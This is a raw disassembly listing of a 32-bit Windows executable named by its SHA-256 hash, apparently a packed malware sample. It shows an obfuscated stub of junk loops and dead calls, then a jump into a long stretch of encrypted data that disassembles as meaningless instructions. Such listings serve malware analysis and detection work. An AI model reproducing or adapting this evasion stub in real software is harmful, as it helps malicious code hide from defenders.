
19ac6b02ff924a8035b7296b38ce392e49b392fdef6748d2000b75019f36d1a5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x80
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	mov    ecx,DWORD PTR ds:0x428657
  401012:	and    DWORD PTR ds:0x428647,ecx
  401018:	push   ebx
  401019:	movzx  ecx,BYTE PTR ds:0x42862f
  401020:	add    DWORD PTR ds:0x4285cf,ecx
  401026:	push   esi
  401027:	and    DWORD PTR ds:0x42867b,0x0
  401031:	jmp    0x401043
  401036:	mov    esi,DWORD PTR ds:0x42867b
  40103c:	inc    esi
  40103d:	mov    DWORD PTR ds:0x42867b,esi
  401043:	cmp    DWORD PTR ds:0x42867b,0x17
  40104a:	jae    0x401084
  401050:	cmp    DWORD PTR ds:0x42867b,0x24
  401057:	jb     0x401084
  40105d:	jmp    0x40107f
  401062:	push   0x312f
  401067:	push   0x3b66
  40106c:	push   0x8bcc
  401071:	push   DWORD PTR [ebp-0x14]
  401074:	push   0x61c9
  401079:	call   DWORD PTR ds:0x42879f
  40107f:	jmp    0x401036
  401084:	push   edi
  401085:	and    DWORD PTR ds:0x4285e3,0x0
  40108f:	mov    esi,DWORD PTR ds:0x4285e3
  401095:	inc    esi
  401096:	mov    DWORD PTR ds:0x4285e3,esi
  40109c:	cmp    DWORD PTR ds:0x4285e3,0x20
  4010a3:	jbe    0x4010c4
  4010a9:	jmp    0x4010b7
  4010ae:	push   DWORD PTR [ebp-0x18]
  4010b1:	call   DWORD PTR ds:0x4287a3
  4010b7:	cmp    DWORD PTR ds:0x4285e3,0x1f
  4010be:	jb     0x40108f
  4010c4:	mov    esi,0x75108a4
  4010c9:	inc    ecx
  4010ca:	xor    eax,esi
  4010cc:	mov    edi,0x3272ec
  4010d1:	add    eax,edi
  4010d3:	mov    DWORD PTR [ebp-0x28],eax
  4010d6:	and    eax,eax
  4010d8:	mov    eax,ds:0x42816f
  4010dd:	xor    ecx,DWORD PTR ds:0x4285cf
  4010e3:	mov    eax,DWORD PTR [eax]
  4010e5:	sub    DWORD PTR ds:0x42861b,ecx
  4010eb:	mov    DWORD PTR [ebp-0x20],eax
  4010ee:	adc    DWORD PTR ds:0x42862b,edi
  4010f4:	mov    eax,ds:0x428377
  4010f9:	xor    DWORD PTR ds:0x428603,ebx
  4010ff:	mov    eax,DWORD PTR [eax]
  401101:	neg    ecx
  401103:	mov    DWORD PTR [ebp-0x18],eax
  401106:	sbb    DWORD PTR ds:0x428643,ecx
  40110c:	mov    DWORD PTR [ebp-0x24],0xf89c87b0
  401113:	and    DWORD PTR ds:0x42866b,ecx
  401119:	mov    eax,DWORD PTR [ebp-0x24]
  40111c:	mov    ecx,DWORD PTR ds:0x4286a7
  401122:	mov    ecx,DWORD PTR [ecx]
  401124:	sbb    DWORD PTR ds:0x428633,ecx
  40112a:	xor    eax,esi
  40112c:	and    DWORD PTR ds:0x428657,0x0
  401136:	mov    ecx,DWORD PTR ds:0x428657
  40113c:	inc    ecx
  40113d:	mov    DWORD PTR ds:0x428657,ecx
  401143:	cmp    DWORD PTR ds:0x428657,0x15
  40114a:	jg     0x401170
  401150:	jmp    0x401163
  401155:	push   DWORD PTR [ebp-0x20]
  401158:	push   0x428097
  40115d:	call   DWORD PTR ds:0x4287a7
  401163:	cmp    DWORD PTR ds:0x428657,0x13
  40116a:	jb     0x401136
  401170:	add    eax,edi
  401172:	mov    DWORD PTR [ebp-0x28],eax
  401175:	adc    DWORD PTR ds:0x428603,0x6a9
  40117f:	mov    eax,ds:0x4282ef
  401184:	sub    ecx,DWORD PTR ds:0x428647
  40118a:	mov    DWORD PTR [ebp-0x28],eax
  40118d:	mov    DWORD PTR ds:0x4285eb,0x1e
  401197:	cmp    DWORD PTR ds:0x4285eb,0x0
  40119e:	je     0x4011d9
  4011a4:	cmp    DWORD PTR ds:0x4285eb,0x2b
  4011ab:	jg     0x4011d9
  4011b1:	jmp    0x4011c7
  4011b6:	push   0x4280ae
  4011bb:	push   DWORD PTR [ebp-0x18]
  4011be:	push   DWORD PTR [ebp-0xc]
  4011c1:	call   DWORD PTR ds:0x4287ab
  4011c7:	mov    ecx,DWORD PTR ds:0x4285eb
  4011cd:	dec    ecx
  4011ce:	mov    DWORD PTR ds:0x4285eb,ecx
  4011d4:	jmp    0x401197
  4011d9:	mov    eax,DWORD PTR [ebp-0x20]
  4011dc:	mov    DWORD PTR ds:0x4285db,0x1c
  4011e6:	cmp    DWORD PTR ds:0x4285db,0x0
  4011ed:	je     0x401222
  4011f3:	cmp    DWORD PTR ds:0x4285db,0x28
  4011fa:	jbe    0x401222
  401200:	jmp    0x401210
  401205:	push   0x428042
  40120a:	call   DWORD PTR ds:0x4287af
  401210:	mov    ecx,DWORD PTR ds:0x4285db
  401216:	dec    ecx
  401217:	mov    DWORD PTR ds:0x4285db,ecx
  40121d:	jmp    0x4011e6
  401222:	mov    DWORD PTR [ebp-0x10],eax
  401225:	and    DWORD PTR ds:0x428627,0x0
  40122f:	jmp    0x40123f
  401234:	mov    eax,ds:0x428627
  401239:	inc    eax
  40123a:	mov    ds:0x428627,eax
  40123f:	cmp    DWORD PTR ds:0x428627,0x1e
  401246:	jae    0x40128e
  40124c:	cmp    DWORD PTR ds:0x428627,0xa
  401253:	jge    0x40128e
  401259:	jmp    0x40126e
  40125e:	push   0x6cd8
  401263:	push   0x4285eb
  401268:	call   DWORD PTR ds:0x4287b3
  40126e:	cmp    DWORD PTR ds:0x428627,0x9
  401275:	jne    0x401289
  40127b:	xor    eax,eax
  40127d:	add    eax,DWORD PTR ds:0x428627
  401283:	inc    eax
  401284:	mov    ds:0x428627,eax
  401289:	jmp    0x401234
  40128e:	mov    eax,DWORD PTR [ebp-0x10]
  401291:	and    DWORD PTR ds:0x4285ff,0x0
  40129b:	mov    ecx,DWORD PTR ds:0x4285ff
  4012a1:	inc    ecx
  4012a2:	mov    DWORD PTR ds:0x4285ff,ecx
  4012a8:	cmp    DWORD PTR ds:0x4285ff,0x5
  4012af:	jl     0x4012e7
  4012b5:	jmp    0x4012c0
  4012ba:	call   DWORD PTR ds:0x4287b7
  4012c0:	cmp    DWORD PTR ds:0x4285ff,0x4
  4012c7:	jne    0x4012da
  4012cd:	mov    ecx,DWORD PTR ds:0x4285ff
  4012d3:	inc    ecx
  4012d4:	mov    DWORD PTR ds:0x4285ff,ecx
  4012da:	cmp    DWORD PTR ds:0x4285ff,0x18
  4012e1:	jb     0x40129b
  4012e7:	push   0x4
  4012e9:	xor    ecx,ecx
  4012eb:	or     ecx,DWORD PTR ds:0x42864b
  4012f1:	sub    DWORD PTR ds:0x4285d3,ecx
  4012f7:	pop    ecx
  4012f8:	or     DWORD PTR ds:0x4285eb,0x6baf
  401302:	sub    ecx,eax
  401304:	and    DWORD PTR ds:0x4285ff,0x0
  40130e:	mov    eax,ds:0x4285ff
  401313:	inc    eax
  401314:	mov    ds:0x4285ff,eax
  401319:	cmp    DWORD PTR ds:0x4285ff,0x1c
  401320:	jg     0x401343
  401326:	jmp    0x401336
  40132b:	push   0x6245
  401330:	call   DWORD PTR ds:0x4287bb
  401336:	cmp    DWORD PTR ds:0x4285ff,0x17
  40133d:	jb     0x40130e
  401343:	add    ecx,DWORD PTR [ebp-0x18]
  401346:	sub    DWORD PTR ds:0x42867b,ecx
  40134c:	mov    DWORD PTR [ebp-0xc],0xf89c85f0
  401353:	mov    DWORD PTR [ebp-0x14],ecx
  401356:	mov    DWORD PTR [ebp-0x80],0xf89c85bc
  40135d:	adc    eax,0x2a9e
  401362:	mov    eax,DWORD PTR [ebp-0x10]
  401365:	mov    DWORD PTR [ebp-0x7c],eax
  401368:	and    DWORD PTR ds:0x42865b,0x0
  401372:	jmp    0x401382
  401377:	mov    eax,ds:0x42865b
  40137c:	inc    eax
  40137d:	mov    ds:0x42865b,eax
  401382:	cmp    DWORD PTR ds:0x42865b,0x14
  401389:	jae    0x4013e1
  40138f:	cmp    DWORD PTR ds:0x42865b,0xd
  401396:	jle    0x4013e1
  40139c:	jmp    0x4013c1
  4013a1:	push   0x5c8c
  4013a6:	push   0x42800b
  4013ab:	push   DWORD PTR [ebp-0x18]
  4013ae:	push   0x42800b
  4013b3:	push   0x513b
  4013b8:	push   DWORD PTR [ebp-0xc]
  4013bb:	call   DWORD PTR ds:0x4287bf
  4013c1:	cmp    DWORD PTR ds:0x42865b,0xc
  4013c8:	jne    0x4013dc
  4013ce:	xor    eax,eax
  4013d0:	add    eax,DWORD PTR ds:0x42865b
  4013d6:	inc    eax
  4013d7:	mov    ds:0x42865b,eax
  4013dc:	jmp    0x401377
  4013e1:	mov    eax,DWORD PTR [ebp-0x14]
  4013e4:	adc    DWORD PTR ds:0x42860f,0x676
  4013ee:	mov    DWORD PTR [ebp-0x78],eax
  4013f1:	mov    eax,DWORD PTR [ebp-0xc]
  4013f4:	sbb    DWORD PTR ds:0x4285db,0x428663
  4013fe:	xor    eax,esi
  401400:	add    eax,edi
  401402:	mov    DWORD PTR [ebp-0x74],eax
  401405:	lea    eax,[ebp-0x1c]
  401408:	mov    DWORD PTR [ebp-0x70],eax
  40140b:	mov    eax,DWORD PTR [ebp-0x80]
  40140e:	jmp    0x4037cc
  401413:	mov    eax,0x80deee36
  401418:	xchg   BYTE PTR [eax-0x320ea8e8],bh
  40141e:	pop    ebx
  40141f:	mov    bl,0x38
  401421:	mov    dl,0xc6
  401423:	jp     0x40149f
  401425:	jp     0x4014a1
  401427:	fstp   QWORD PTR [edi+0x7a]
  40142a:	jp     0x401451
  40142c:	sub    al,0x27
  40142e:	xor    DWORD PTR [ecx],ebx
  401430:	xor    eax,0x42752f1b
  401435:	imul   esi,DWORD PTR [esi+0x19],0x6d6a6a7f
  40143c:	inc    edx
  40143d:	aad    0xdc
  40143f:	icebp  
  401440:	pusha  
  401441:	dec    eax
  401442:	imul   esi,DWORD PTR [ecx+0x5b],0xffffffa0
  401446:	jo     0x4014b5
  401448:	pop    ecx
  401449:	iret   
  40144a:	pop    ebp
  40144b:	dec    edx
  40144c:	xor    BYTE PTR [edx+edi*8+0x4d678697],cl
  401453:	jg     0x40149c
  401455:	xor    BYTE PTR [esi+0x3bb2b07f],0x2c
  40145c:	push   DWORD PTR [esi-0x24]
  40145f:	cli    
  401460:	arpl   WORD PTR [edi+0x1e],di
  401463:	in     eax,dx
  401464:	cmp    ebp,ecx
  401466:	mov    edx,0xde2397ed
  40146b:	mov    ebp,DWORD PTR [ecx]
  40146d:	mulps  xmm5,XMMWORD PTR [ebx+0x6d07d48a]
  401474:	fst    QWORD PTR [esp+eiz*8]
  401477:	push   cs
  401478:	cli    
  401479:	sbb    BYTE PTR ss:[eax+0xc],cl
  40147d:	imul   ebp,DWORD PTR ss:[eax-0x47],0xffffffaf
  401482:	and    edx,DWORD PTR [ecx+0x15]
  401485:	mov    dh,0xff
  401487:	jmp    0x42c43fd5
  40148c:	enter  0xf95b,0x1a
  401490:	cli    
  401491:	js     0x401444
  401493:	jae    0x401472
  401495:	cwde   
  401496:	pop    edi
  401497:	mov    esi,DWORD PTR [ecx+0x41922417]
  40149d:	add    ebx,DWORD PTR [esi+0xb83823c]
  4014a3:	fisubr DWORD PTR ds:0x43448d62
  4014a9:	fs repz iret 
  4014ac:	mov    ch,BYTE PTR [ecx]
  4014ae:	mov    eax,eax
  4014b0:	(bad)  
  4014b1:	int3   
  4014b2:	mov    BYTE PTR [ecx-0xc],ah
  4014b5:	push   ebp
  4014b6:	bound  ecx,QWORD PTR [esp+ecx*1+0x3e]
  4014ba:	add    eax,DWORD PTR [esi+0x13]
  4014bd:	lods   eax,DWORD PTR ds:[esi]
  4014be:	dec    ebx
  4014bf:	retf   0x40b7
  4014c2:	rcl    BYTE PTR [esi+eiz*2],1
  4014c5:	std    
  4014c6:	bound  esp,QWORD PTR [esi-0x4b]
  4014c9:	stc    
  4014ca:	push   0x2552f8bf
  4014cf:	cmp    ebp,DWORD PTR [edx]
  4014d1:	iret   
  4014d2:	sub    BYTE PTR [edi+esi*2],ch
  4014d5:	cmp    sp,WORD PTR [esi-0x7c3cc786]
  4014dc:	sbb    ebx,esp
  4014de:	mov    ah,0x54
  4014e0:	shr    BYTE PTR [esi-0x7f],cl
  4014e3:	scas   eax,DWORD PTR es:[edi]
  4014e4:	aad    0x5e
  4014e6:	and    cl,al
  4014e8:	ret    0x46e
  4014eb:	xor    BYTE PTR [edi],dh
  4014ed:	or     al,0xc2
  4014ef:	loop   0x401550
  4014f1:	add    esi,DWORD PTR [edx+0x5bae2e2e]
  4014f7:	xchg   esp,eax
  4014f8:	inc    esp
  4014f9:	retf   
  4014fa:	out    0x23,al
  4014fc:	fs pop esi
  4014fe:	inc    eax
  4014ff:	aam    0xbd
  401501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401502:	push   edx
  401503:	jnp    0x40156c
  401505:	popf   
  401506:	dec    eax
  401507:	dec    edi
  401508:	iret   
  401509:	jp     0x401543
  40150b:	aam    0x79
  40150d:	xchg   esi,eax
  40150e:	cmp    esp,ecx
  401510:	rcr    esi,1
  401512:	mov    esp,0x8ec7e737
  401517:	iret   
  401518:	sbb    edi,DWORD PTR [esi-0x1f]
  40151b:	ror    DWORD PTR [edx+0x648cdd83],0xf0
  401522:	mov    esi,ecx
  401524:	or     ebp,DWORD PTR [ebp+eiz*8+0x9d436d2]
  40152b:	adc    eax,0x803e8c9
  401530:	jae    0x40158c
  401532:	pop    ss
  401533:	popa   
  401534:	inc    edi
  401535:	not    DWORD PTR [ecx+0x5a]
  401538:	pop    ss
  401539:	jnp    0x4014e3
  40153b:	clc    
  40153c:	jb     0x401540
  40153e:	shr    bl,0xc8
  401541:	sbb    DWORD PTR [edi-0x710fd29c],ebx
  401547:	ss clc 
  401549:	pop    ss
  40154a:	mov    eax,ds:0x79b97cc3
  40154f:	jno    0x401510
  401551:	mov    ebx,0xef043229
  401556:	xor    BYTE PTR [edx],cl
  401558:	lea    ebp,[esi]
  40155a:	loopne 0x4014f4
  40155c:	pop    eax
  40155d:	inc    esi
  40155e:	es imul ebp,esi,0xffffffe2
  401562:	xchg   eax,esp
  401564:	push   esp
  401565:	arpl   ax,si
  401567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401568:	rcl    cl,0x18
  40156b:	gs retf 
  40156d:	lds    eax,FWORD PTR [eax-0x75]
  401570:	mov    esp,0x58db208b
  401575:	add    ch,BYTE PTR [ecx]
  401577:	inc    esi
  401578:	inc    edi
  401579:	jo     0x401538
  40157b:	push   esi
  40157c:	dec    ebp
  40157d:	in     al,0x6b
  40157f:	lds    edx,FWORD PTR [edx+0x513ff39c]
  401585:	sub    esp,ebx
  401587:	pop    eax
  401588:	sbb    dh,al
  40158a:	xor    edi,0xffffffec
  40158d:	daa    
  40158e:	xor    eax,0xe1d16284
  401593:	push   edi
  401594:	push   esi
  401595:	jno    0x401552
  401597:	retf   
  401598:	push   esp
  401599:	lods   eax,DWORD PTR ds:[esi]
  40159a:	int3   
  40159b:	(bad)  
  40159c:	rcl    BYTE PTR [edx+0xc],1
  40159f:	inc    ecx
  4015a0:	jae    0x401598
  4015a2:	js     0x4015e4
  4015a4:	mov    ah,0x2
  4015a6:	lods   eax,DWORD PTR ds:[esi]
  4015a7:	adc    bh,BYTE PTR [ebp+0x36]
  4015aa:	xchg   BYTE PTR [ecx+0x4ce48983],bl
  4015b0:	inc    esp
  4015b1:	std    
  4015b2:	mov    al,ds:0x53f5afa8
  4015b7:	test   al,0xff
  4015b9:	addr16 nop
  4015bb:	inc    ecx
  4015bc:	mov    esp,0xcda0babf
  4015c1:	aam    0x87
  4015c3:	or     al,0x9a
  4015c5:	or     bh,BYTE PTR [edx-0x13]
  4015c8:	jne    0x4015b4
  4015ca:	dec    esp
  4015cb:	sbb    al,0x63
  4015cd:	je     0x401642
  4015cf:	xor    al,0x2b
  4015d1:	mov    bl,0xdf
  4015d3:	or     ebx,DWORD PTR [edi+0x72]
  4015d6:	lahf   
  4015d7:	mov    esp,0xd05fdf7d
  4015dc:	std    
  4015dd:	ss cs jae 0x40160b
  4015e1:	leave  
  4015e2:	ret    0xec7a
  4015e5:	ds (bad) 
  4015e8:	xor    al,0x6d
  4015ea:	(bad)  
  4015eb:	imul   ebp,DWORD PTR [edi+edx*1],0xffffffc9
  4015ef:	push   edi
  4015f0:	xchg   esi,eax
  4015f1:	lods   al,BYTE PTR ds:[esi]
  4015f2:	enter  0x3132,0xa9
  4015f6:	pop    ecx
  4015f7:	push   ss
  4015f8:	mov    BYTE PTR [ebx-0x9027810],dh
  4015fe:	sub    al,0x16
  401600:	or     esp,DWORD PTR [edx+0x55d319be]
  401606:	call   0xab3388d1
  40160b:	loopne 0x401612
  40160d:	mov    al,0xa9
  40160f:	fcom   DWORD PTR [ebp-0x7790e8f4]
  401615:	add    al,ch
  401617:	mov    al,ds:0xdd956d5f
  40161c:	sahf   
  40161d:	ret    0xb3d9
  401620:	mov    edi,0xfdbf2063
  401625:	dec    eax
  401626:	xor    al,0x67
  401628:	xlat   BYTE PTR ds:[ebx]
  401629:	inc    esp
  40162a:	mov    esp,0xf518c0e8
  40162f:	mov    ebp,0x94e6c15c
  401634:	push   ss
  401635:	sub    edx,DWORD PTR [ebp+0x66]
  401638:	dec    edx
  401639:	add    al,0xe7
  40163b:	fstp   TBYTE PTR [ebp+ecx*1-0x40]
  40163f:	aad    0x2
  401641:	leave  
  401642:	cld    
  401643:	aas    
  401644:	imul   esp,DWORD PTR ds:0x31d62422,0x19927be0
  40164e:	jbe    0x4016b0
  401650:	pop    edx
  401651:	int3   
  401652:	dec    esp
  401653:	push   ebx
  401654:	xor    ebx,eax
  401656:	adc    al,BYTE PTR [edi+esi*1+0x57]
  40165a:	fs jno 0x40160f
  40165d:	enter  0xc70d,0xd4
  401661:	and    eax,0x14f60d9e
  401666:	sbb    eax,0x8d994790
  40166b:	or     BYTE PTR [esi+0xb0ce780],al
  401671:	cmp    al,0x44
  401673:	fsubr  QWORD PTR [edx+0x6d]
  401676:	cmp    eax,0x331cc096
  40167b:	std    
  40167c:	sub    al,0xde
  40167e:	ja     0x4016a3
  401680:	sub    ebx,0x45cd95c1
  401686:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401688:	int    0x96
  40168a:	out    dx,eax
  40168b:	add    eax,0xc01a6f4f
  401690:	mov    ds:0x7f922207,eax
  401695:	retf   
  401696:	sbb    bl,0xcd
  401699:	or     dl,dl
  40169b:	fnstenv [ebp+edx*1-0x69]
  40169f:	hlt    
  4016a0:	les    eax,FWORD PTR [esi]
  4016a2:	inc    esi
  4016a3:	shl    DWORD PTR [eax+0x12979d43],cl
  4016a9:	sbb    bh,BYTE PTR [ebx]
  4016ab:	inc    eax
  4016ac:	mov    esi,0x37aa104f
  4016b1:	stc    
  4016b2:	xor    BYTE PTR [ebx+0x240be119],cl
  4016b8:	js     0x401713
  4016ba:	test   ebp,edi
  4016bc:	test   eax,0x7a44293a
  4016c1:	arpl   cx,si
  4016c3:	and    bl,BYTE PTR [edi]
  4016c5:	mov    dl,ch
  4016c7:	ror    DWORD PTR [esi+ecx*8],1
  4016ca:	push   eax
  4016cb:	xor    eax,0xa33d8e0f
  4016d0:	jg     0x401693
  4016d2:	jo     0x4016f3
  4016d4:	lods   eax,DWORD PTR ds:[esi]
  4016d5:	rcl    BYTE PTR [esi],cl
  4016d7:	repnz sub bh,bl
  4016da:	cmc    
  4016db:	or     DWORD PTR [edx+0x30],ecx
  4016de:	stc    
  4016df:	adc    esi,DWORD PTR [ebp+edx*1+0x3c]
  4016e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016e4:	ficom  WORD PTR [eax+0x286c2fce]
  4016ea:	mov    BYTE PTR ds:0x41db3be8,al
  4016f0:	arpl   WORD PTR [esi-0x73],ax
  4016f3:	add    ebx,DWORD PTR [ebp-0x4289892f]
  4016f9:	adc    al,0x1f
  4016fb:	mov    ebx,0xf308065e
  401700:	mov    bl,0x6
  401702:	mov    WORD PTR [ebp-0x6a],?
  401705:	xor    dh,cl
  401707:	sti    
  401708:	sub    BYTE PTR [edx+0x4978662b],bl
  40170e:	sbb    al,0x7b
  401710:	(bad)  
  401711:	and    al,al
  401713:	clc    
  401714:	in     eax,dx
  401715:	jnp    0x401778
  401717:	or     eax,0xc26b556b
  40171c:	retf   
  40171d:	adc    ecx,0x59
  401720:	loope  0x4016ed
  401722:	js     0x4016ac
  401724:	mov    eax,ds:0x4684e892
  401729:	pop    edi
  40172a:	ror    DWORD PTR [esi],0xb7
  40172d:	dec    ebx
  40172e:	cmp    ch,dl
  401730:	pop    es
  401731:	cld    
  401732:	or     dh,BYTE PTR [ecx+0x3daadbab]
  401738:	pop    esp
  401739:	jmp    0xad85:0xc7375aeb
  401740:	int3   
  401741:	test   al,0xc6
  401743:	jmp    0x291fceb3
  401748:	push   esp
  401749:	stc    
  40174a:	mov    cl,0x15
  40174c:	icebp  
  40174d:	loop   0x4016f2
  40174f:	inc    edi
  401750:	or     DWORD PTR [ecx+eax*4],esp
  401753:	or     edx,esi
  401755:	mov    ebp,0x19a2c6df
  40175a:	arpl   WORD PTR [eax],si
  40175c:	add    BYTE PTR [eax-0x78cad14e],ah
  401762:	outs   dx,BYTE PTR ds:[esi]
  401764:	sbb    dl,BYTE PTR [ecx]
  401766:	inc    ebx
  401767:	mov    ch,0x35
  401769:	or     DWORD PTR [ebp+esi*8-0x2b],esp
  40176d:	sbb    al,0x42
  40176f:	fnstcw WORD PTR [esi+ebp*8-0x25eb77e6]
  401776:	sbb    esp,eax
  401778:	adc    BYTE PTR [eax+0x604301e2],dl
  40177e:	mov    ch,0xe
  401780:	lods   eax,DWORD PTR ds:[esi]
  401781:	xchg   ebx,eax
  401782:	shl    BYTE PTR [edi+0x7bb97e88],cl
  401788:	popa   
  401789:	daa    
  40178a:	fmul   DWORD PTR [esi+0x9]
  40178d:	push   ecx
  40178e:	and    eax,0x10e5fe8c
  401793:	bound  ebx,QWORD PTR [esi]
  401795:	cwde   
  401796:	pop    ebp
  401797:	inc    ecx
  401798:	rcl    BYTE PTR [ebx],0x33
  40179b:	mov    dl,0x93
  40179d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40179e:	adc    ax,0xd6c5
  4017a2:	sub    dh,dh
  4017a4:	fmul   QWORD PTR [edi-0x268490f1]
  4017aa:	jnp    0x4017ba
  4017ac:	pusha  
  4017ad:	cmc    
  4017ae:	imul   esi,DWORD PTR [edi],0xca34e135
  4017b4:	outs   dx,BYTE PTR ds:[esi]
  4017b5:	(bad)
  4017b8:	cmp    eax,0x6300d1a7
  4017bd:	dec    esp
  4017be:	(bad)  
  4017c0:	ja     0x4017e7
  4017c2:	mov    bh,0x22
  4017c4:	jmp    DWORD PTR [eax]
  4017c6:	loopne 0x401826
  4017c8:	dec    esi
  4017c9:	dec    esp
  4017ca:	sbb    esi,ebp
  4017cc:	cs aaa 
  4017ce:	mov    eax,0xab4f7910
  4017d3:	jle    0x401803
  4017d5:	stc    
  4017d6:	push   esi
  4017d7:	fiadd  DWORD PTR [esi]
  4017d9:	push   ss
  4017da:	(bad)
  4017dd:	add    bl,BYTE PTR [ecx-0x6d]
  4017e0:	shl    BYTE PTR [ebx+0x2fae1716],0x3e
  4017e7:	cmp    ecx,eax
  4017e9:	xor    DWORD PTR [ebx+ecx*1],ebx
  4017ec:	sub    DWORD PTR [ecx-0x1f505553],0x2faed40b
  4017f6:	loope  0x40186a
  4017f8:	repnz push esi
  4017fa:	or     al,0x7d
  4017fc:	pop    ebx
  4017fd:	push   ss
  4017fe:	loop   0x4017f1
  401800:	or     eax,0x45383724
  401805:	sub    eax,0x3a051589
  40180a:	mov    eax,ds:0xbd450285
  40180f:	test   al,0x4e
  401811:	leave  
  401812:	adc    al,0xc1
  401814:	sti    
  401815:	cmp    ebx,ecx
  401817:	and    DWORD PTR [ebx+0x1af6bf29],ebp
  40181d:	adc    al,0xec
  40181f:	xchg   esi,eax
  401820:	in     eax,dx
  401821:	std    
  401822:	push   ecx
  401823:	sub    al,0x34
  401825:	test   cl,0xfa
  401828:	popf   
  401829:	retf   0xfdfa
  40182c:	cmp    dl,BYTE PTR [esi-0x72]
  40182f:	aas    
  401830:	jnp    0x401808
  401832:	into   
  401833:	add    ebx,esi
  401835:	mov    edx,0xed2eeade
  40183a:	push   ebp
  40183b:	pop    ds
  40183c:	jl     0x401884
  40183e:	js     0x4017c2
  401840:	jne    0x401821
  401842:	mov    ebx,0x53dd1ed9
  401847:	test   al,0x22
  401849:	mov    ch,al
  40184b:	dec    ebx
  40184c:	iret   
  40184d:	dec    DWORD PTR [ebx+0x56]
  401850:	inc    esp
  401851:	pop    edx
  401852:	iret   
  401853:	pop    edx
  401854:	jmp    0x401834
  401856:	and    al,0x7
  401858:	stos   DWORD PTR es:[edi],eax
  401859:	repz xchg esi,eax
  40185b:	sub    dl,BYTE PTR [esp+eax*4+0x23ca3c69]
  401862:	sar    DWORD PTR [ebp+0x44f8fc1b],0xa0
  401869:	mov    bh,0x2e
  40186b:	scas   eax,DWORD PTR es:[edi]
  40186c:	mov    WORD PTR [edi+ebx*4-0x5b],cs
  401870:	lock (bad) 
  401872:	adc    bh,BYTE PTR [eax-0x7e642817]
  401878:	(bad)  
  401879:	pop    ebx
  40187a:	data16 sbb al,0x6c
  40187d:	or     eax,0x776b21ca
  401882:	cmp    eax,0x38de2d8c
  401887:	inc    esi
  401888:	jae    0x4018c5
  40188a:	outs   dx,BYTE PTR ds:[esi]
  40188b:	mov    BYTE PTR [ebx+0x2f],bh
  40188e:	mov    al,0x12
  401890:	push   ds
  401891:	mov    bl,0xfd
  401893:	sar    DWORD PTR [ecx+0x39c269fc],1
  401899:	loop   0x401871
  40189b:	dec    eax
  40189c:	pusha  
  40189d:	mov    edx,0x34780a61
  4018a2:	mov    WORD PTR [ebx],ss
  4018a4:	dec    ebp
  4018a5:	popa   
  4018a6:	adc    al,0xe1
  4018a8:	pop    ebx
  4018a9:	test   esp,eax
  4018ab:	cmc    
  4018ac:	pushf  
  4018ad:	sti    
  4018ae:	sbb    bl,bh
  4018b0:	enter  0x99a6,0xe6
  4018b4:	mov    dl,BYTE PTR [ebx+0x30]
  4018b7:	jmp    0x40184d
  4018b9:	or     DWORD PTR [eax+0x4b],edi
  4018bc:	xor    edx,DWORD PTR [edx]
  4018be:	xor    BYTE PTR [eax-0x5fb01fd0],cl
  4018c4:	push   ss
  4018c5:	inc    esp
  4018c6:	clc    
  4018c7:	jp     0x40193b
  4018c9:	pop    ss
  4018ca:	in     al,dx
  4018cb:	mov    al,0xc9
  4018cd:	(bad)  
  4018ce:	mov    WORD PTR [eax],cs
  4018d0:	stc    
  4018d1:	(bad)  
  4018d2:	leave  
  4018d3:	sbb    edi,esp
  4018d5:	je     0x401860
  4018d7:	data16 stos BYTE PTR es:[edi],al
  4018d9:	jb     0x40188f
  4018db:	cmp    eax,0x646523d9
  4018e0:	push   ds
  4018e1:	dec    eax
  4018e2:	dec    ebx
  4018e3:	bound  esp,QWORD PTR [edx+ecx*1+0x6b290b28]
  4018ea:	clc    
  4018eb:	mov    ah,0xa0
  4018ed:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4018ef:	cmp    eax,0xfdbd257a
  4018f4:	mov    esi,DWORD PTR [edi-0x2c]
  4018f7:	pop    edx
  4018f8:	xchg   DWORD PTR [esp+ecx*1],ecx
  4018fb:	dec    ebp
  4018fc:	mov    eax,ds:0x1d31e2c
  401901:	icebp  
  401902:	pusha  
  401903:	es fwait
  401905:	dec    esp
  401906:	test   BYTE PTR [ecx+0x5],bh
  401909:	cmc    
  40190a:	clc    
  40190b:	xchg   esi,eax
  40190c:	dec    ebx
  40190d:	mov    WORD PTR [ebp-0x17],fs
  401910:	adc    DWORD PTR [eax+0x240e8baa],edx
  401916:	xlat   BYTE PTR ds:[ebx]
  401917:	in     al,0xfb
  401919:	adc    eax,0x1eff419e
  40191e:	xlat   BYTE PTR ds:[ebx]
  40191f:	rol    DWORD PTR [ecx],0x24
  401922:	inc    eax
  401923:	cmp    ecx,ebx
  401925:	inc    ecx
  401926:	jnp    0x4018c4
  401928:	cmp    DWORD PTR [esi-0x2b4e41a6],0x6407e581
  401932:	psllw  mm0,QWORD PTR [edi-0x484d09ba]
  401939:	jmp    0x401973
  40193b:	cmp    bl,BYTE PTR [ecx+0x173841e8]
  401941:	mov    BYTE PTR [ecx],cl
  401943:	imul   ebx,edi,0x1
  401946:	(bad)  
  40194a:	test   BYTE PTR [ebp+0x3fe17fa2],bh
  401950:	adc    eax,DWORD PTR [eax+0x2f]
  401953:	sub    dl,BYTE PTR [ebp+0x634e2005]
  401959:	adc    eax,0xeecb5c55
  40195e:	xchg   ebx,eax
  40195f:	cmp    cl,cl
  401961:	lods   al,BYTE PTR ds:[esi]
  401962:	mov    ah,0xf6
  401964:	fwait
  401965:	jnp    0x40195f
  401967:	mov    al,0xc3
  401969:	mov    al,0x4c
  40196b:	pop    ebp
  40196c:	sub    al,0xc1
  40196e:	cmc    
  40196f:	lock les esp,FWORD PTR [esi+edi*1-0x1d]
  401974:	call   0xb7b7f7a0
  401979:	sahf   
  40197a:	pop    esp
  40197b:	data16 lock inc ax
  40197f:	mov    cl,0x19
  401981:	add    ebx,DWORD PTR [edi]
  401983:	dec    ebx
  401984:	loopne 0x40193b
  401986:	inc    esp
  401987:	cwde   
  401988:	inc    edx
  401989:	test   eax,0x1aeab06c
  40198e:	dec    eax
  40198f:	cmp    al,0x77
  401991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
